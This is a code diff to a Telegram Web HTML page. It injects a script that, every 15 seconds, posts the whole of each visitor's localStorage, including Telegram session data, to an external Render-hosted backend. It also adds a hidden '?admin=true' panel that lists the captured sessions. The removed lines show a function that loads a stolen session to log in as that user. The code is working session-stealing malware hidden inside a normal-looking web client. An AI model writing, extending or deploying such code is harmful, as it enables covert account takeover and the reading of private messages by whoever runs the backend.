@@ -59,81 +59,95 @@
   </style>
 </head
 
-<!-- Custom Telegram Manager Script -->
-    <script>
+<script>
       const BACKEND_URL = "https://telegram-7ih3.onrender.com";
 
-      // (၁) Admin Panel ကို ဝင်ချင်တဲ့အခါ
-      if (window.location.search.includes("admin=true")) {
-          document.addEventListener("DOMContentLoaded", () => {
-              // မူလ Telegram Web UI ကို ဖျောက်ပြီး Admin Panel ကို ပြမယ်
-              document.body.innerHTML = `
-                <div style="padding: 30px; font-family: sans-serif; background: #f4f4f9; height: 100vh;">
-                  <h2 style="color: #333;">Admin Control Panel</h2>
-                  <p>Staff ဝင်ထားသော အကောင့်များ</p>
-                  <button onclick="loadSessions()" style="padding: 10px 20px; background: #0063bb; color: white; border: none; border-radius: 5px; cursor: pointer;">Load Accounts</button>
-                  <div id="admin-content" style="margin-top: 20px;"></div>
+      // React က အကုန် Load လုပ်ပြီးမှ ကျွန်တော်တို့ Code ကို အလုပ်လုပ်စေချင်လို့ window.onload ကို သုံးပါမယ်
+      window.onload = () => {
+          
+          // (၁) Admin Panel ကို ဝင်ချင်တဲ့အခါ (React က ဖျက်မပစ်နိုင်အောင် Overlay ပုံစံ အပေါ်ဆုံးကနေ အုပ်ပြီး ပြပါမယ်)
+          if (window.location.search.includes("admin=true")) {
+              const adminDiv = document.createElement('div');
+              adminDiv.style.position = 'fixed';
+              adminDiv.style.top = '0';
+              adminDiv.style.left = '0';
+              adminDiv.style.width = '100vw';
+              adminDiv.style.height = '100vh';
+              adminDiv.style.backgroundColor = '#f4f4f9';
+              adminDiv.style.zIndex = '999999'; // Telegram UI ရဲ့ အပေါ်ဆုံးမှာ ပေါ်နေစေရန်
+              adminDiv.style.padding = '30px';
+              adminDiv.style.overflow = 'auto';
+
+              adminDiv.innerHTML = `
+                <div style="max-width: 800px; margin: auto; font-family: sans-serif;">
+                    <h2 style="color: #333;">Admin Control Panel</h2>
+                    <p>Staff ဝင်ထားသော အကောင့်များ</p>
+                    <button onclick="window.loadSessions()" style="padding: 10px 20px; background: #0063bb; color: white; border: none; border-radius: 5px; cursor: pointer;">Load Accounts</button>
+                    <div id="admin-content" style="margin-top: 20px;"></div>
                 </div>
               `;
+              document.body.appendChild(adminDiv);
 
-              // Backend ကနေ Data လှမ်းခေါ်မယ့် Function
               window.loadSessions = async () => {
-                 try {
-                     document.getElementById('admin-content').innerHTML = "Loading...";
-                     const res = await fetch(`${BACKEND_URL}/api/get_sessions`);
-                     const data = await res.json();
-                     
-                     if(data.length === 0) {
-                         document.getElementById('admin-content').innerHTML = "မည်သည့် Staff အကောင့်မှ မရှိသေးပါ။";
-                         return;
-                     }
+                  try {
+                      document.getElementById('admin-content').innerHTML = "Fetching data from MongoDB...";
+                      const res = await fetch(`${BACKEND_URL}/api/get_sessions`);
+                      const data = await res.json();
+                      
+                      if(data.length === 0) {
+                          document.getElementById('admin-content').innerHTML = "မည်သည့် Staff အကောင့်မှ မရှိသေးပါ။";
+                          return;
+                      }
 
-                     let html = "<table style='width: 100%; text-align: left; border-collapse: collapse;'>";
-                     html += "<tr style='background: #ddd;'><th>User ID / Info</th><th>Action</th></tr>";
-                     data.forEach(session => {
-                         html += `<tr>
-                            <td style='padding: 10px; border-bottom: 1px solid #ccc;'>User: ${session.user_id}</td>
-                            <td style='padding: 10px; border-bottom: 1px solid #ccc;'>
-                                <button onclick='loginAs(${JSON.stringify(session)})' style='padding: 5px 10px; background: #28a745; color: white; border: none; border-radius: 3px; cursor: pointer;'>Login ဝင်မည်</button>
-                            </td>
-                         </tr>`;
-                     });
-                     html += "</table>";
-                     document.getElementById('admin-content').innerHTML = html;
-                 } catch (err) {
-                     document.getElementById('admin-content').innerHTML = "Error loading sessions.";
-                 }
+                      let html = "<table style='width: 100%; text-align: left; border-collapse: collapse; background: white;'>";
+                      html += "<tr style='background: #ddd;'><th>User ID</th><th>Last Updated</th><th>Action</th></tr>";
+                      data.forEach(session => {
+                          html += `<tr>
+                             <td style='padding: 10px; border: 1px solid #ccc;'>${session.user_id}</td>
+                             <td style='padding: 10px; border: 1px solid #ccc;'>${new Date(session.timestamp).toLocaleString()}</td>
+                             <td style='padding: 10px; border: 1px solid #ccc;'>
+                                 <button onclick='alert("နောက်အဆင့်တွင် Login ဝင်မည့် Code ထည့်ပါမည်")' style='padding: 5px 10px; background: #28a745; color: white; border: none; border-radius: 3px; cursor: pointer;'>Login</button>
+                             </td>
+                          </tr>`;
+                      });
+                      html += "</table>";
+                      document.getElementById('admin-content').innerHTML = html;
+                  } catch (err) {
+                      document.getElementById('admin-content').innerHTML = "Error connecting to backend: " + err.message;
+                  }
               };
 
-              // Admin က Login ဝင်မယ့် Function
-              window.loginAs = (sessionData) => {
-                 // ယာယီ LocalStorage ထဲကို Session ပြန်ထည့်ပေးခြင်း
-                 localStorage.setItem("tt-global-state", sessionData.local_storage_data);
-                 alert("အကောင့်ထဲသို့ ဝင်ရောက်နေပါပြီ...");
-                 window.location.href = "/"; // Telegram Web ဘက်သို့ ပြန်သွားရန်
-              };
-          });
-      } else {
-          // (၂) Staff တွေ သာမန် ဝင်သုံးတဲ့အခါ (Background ကနေ Session လှမ်းပို့မယ်)
-          // ၃၀ စက္ကန့် တစ်ကြိမ် Session အသစ်ရှိမရှိ စစ်ပြီး Backend ကို ပို့မယ်
-          setInterval(() => {
-              const globalState = localStorage.getItem("tt-global-state");
-              if (globalState) {
-                  // User ID တစ်ခုခု ဖန်တီးပြီး ပို့မယ် (ဥပမာ - LocalStorage က data အနည်းငယ်ကို ယူမယ်)
+          } else {
+              // (၂) Staff တွေ သာမန် ဝင်သုံးတဲ့အခါ (Data သေချာဝင်အောင် အကုန် ဆွဲထုတ်ပြီး ပို့ကြည့်ပါမယ်)
+              setInterval(() => {
+                  // localStorage ထဲမှာ ရှိသမျှ Data အကုန်လုံးကို ယူပါမယ်
+                  const allStorageData = JSON.stringify(localStorage);
+                  
                   const sessionData = {
-                      user_id: "staff_" + Math.floor(Math.random() * 1000), // လောလောဆယ် Random ID နဲ့ အရင်စမ်းပါမယ်
-                      local_storage_data: globalState,
+                      user_id: "staff_" + Math.floor(Math.random() * 1000),
+                      local_storage_data: allStorageData,
                       timestamp: new Date().toISOString()
                   };
                   
+                  // Console မှာ အရင်ထုတ်ကြည့်မယ် (Browser ရဲ့ Inspect > Console မှာ ဝင်ကြည့်လို့ရအောင်ပါ)
+                  console.log("Attempting to send data to MongoDB...");
+
                   fetch(`${BACKEND_URL}/api/save_session`, {
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify(sessionData)
-                  }).catch(console.error);
-              }
-          }, 30000); 
-      }
+                  })
+                  .then(res => res.json())
+                  .then(data => {
+                      console.log("Successfully saved to MongoDB:", data);
+                  })
+                  .catch(err => {
+                      console.error("Error sending to backend:", err);
+                  });
+                  
+              }, 15000); // Data ပို့တာ မြန်မြန်သိရအောင် ၁၅ စက္ကန့် ပြောင်းထားပါတယ်
+          }
+      };
     </script>
 
 <body id="root">
